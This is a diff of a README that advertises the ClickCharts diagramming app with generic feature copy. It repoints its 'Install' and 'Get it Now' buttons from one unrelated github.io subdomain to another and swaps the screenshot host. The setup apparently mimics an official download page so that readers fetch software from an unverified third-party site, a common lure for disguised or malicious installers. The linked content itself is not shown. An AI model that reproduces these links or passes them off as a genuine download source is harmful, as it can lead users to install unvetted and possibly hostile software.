@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gazan-programs.github.io/.github/clickCharts)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/clickCharts)
 
 </div>
 
@@ -27,7 +27,7 @@ The <a href="#clickCharts">drag-and-drop diagram canvas</a> builds diagrams by s
 The <a href="#clickCharts">multiple diagram type support</a> handles the variety of diagram formats that different communication needs require — process flowcharts for documenting procedures, organizational charts for displaying reporting structures, UML class diagrams for software architecture, swimlane diagrams for cross-functional process documentation, data flow diagrams for information system analysis, mind maps for brainstorming and concept organization, and network diagrams for IT infrastructure documentation. The <a href="#clickCharts">connection line tools</a> draw lines and arrows between shapes with configurable styles — straight lines, elbow connectors, curved connections, and arrowhead options that communicate the direction and relationship type between connected elements.
 
 <p align="center">
-  <img src="https://static.macupdate.com/screenshots/338794/m/clickcharts-screenshot.png?v=1660904567" alt="ClickCharts screenshot"/>
+  <img src="https://img.utdstc.com/screen/2c7/40e/2c740ee024c09ecc9ee3cbc815361f2f69d4ac32d0fe37f4fff1a5597d6259ba:600" alt="ClickCharts screenshot"/>
 </p>
 
 <a href="#clickCharts">Text and label formatting</a> configures font, size, color, and alignment for shape labels and standalone text elements — professional-looking diagrams that communicate clearly without requiring design expertise. <a href="#clickCharts">Color and style customization</a> applies fill colors, border styles, line weights, and opacity to shapes and connections — visual differentiation between diagram elements that aids comprehension.
@@ -81,7 +81,7 @@ ClickCharts' value is in making professional-looking visual documentation access
 
 <p align="center">
 
-[![Get it Now ClickCharts](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/clickCharts)
+[![Get it Now ClickCharts](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/clickCharts)
 
 </p>
 
